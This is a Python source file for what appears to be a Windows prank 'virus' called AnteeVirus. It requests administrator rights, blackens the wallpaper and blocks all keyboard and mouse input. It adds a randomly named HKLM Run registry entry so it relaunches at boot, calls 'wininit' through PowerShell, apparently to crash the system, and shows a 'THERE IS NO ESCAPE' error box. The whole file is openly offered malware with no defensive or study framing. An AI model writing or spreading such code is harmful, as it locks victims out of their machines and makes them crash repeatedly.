import subprocess
import ctypes
import sys
import os
import tkinter.messagebox as mb
from ctypes import wintypes
import time
import threading
import playsound
import pyautogui
import PyWallpaper
import random
import winreg as wrg
location = wrg.HKEY_LOCAL_MACHINE

BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL
one = True
def crash():
    soft = wrg.OpenKeyEx(location, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",access=wrg.KEY_WRITE)
    wrg.SetValueEx(soft, f"{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}{chr(random.randint(65,90))}",\
                      0, wrg.REG_SZ, f"{os.getcwd()}\\AnteeVirus.exe") 

    playsound.playsound("b.wav")
    subprocess.call(["powershell","-Command","wininit"])

#ask for admin
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

PyWallpaper.change_wallpaper("C:/Users/user/AnteeVirus/black.png")
pyautogui.hotkey('winleft','d')

#begin phase 1
t = threading.Thread(target=crash)
t.start()

BlockInput(True)
mb.showerror("ur cooked","THERE IS NO ESCAPE")